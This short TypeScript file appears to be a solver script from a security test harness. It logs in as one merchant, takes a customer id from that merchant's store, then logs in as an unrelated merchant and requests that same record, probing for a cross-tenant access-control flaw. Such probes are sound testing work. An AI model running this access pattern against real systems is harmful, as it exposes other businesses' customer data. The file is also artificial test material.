// Read a different store's customer record by its id while signed in as an unrelated merchant.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

interface CustomerRef { external_id: string }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_b')
  const list = await ctx.fetch(buildPath(ctx.plan, 'listCustomers'), { method: 'GET' })
  const data = (await list.json().catch(() => ({}))) as { customers?: CustomerRef[] }
  const victim = data.customers?.[0]
  if (!victim) return
  await ctx.login('persona_a')
  await ctx.fetch(buildPath(ctx.plan, 'getCustomer', { customerId: victim.external_id }), { method: 'GET' })
}
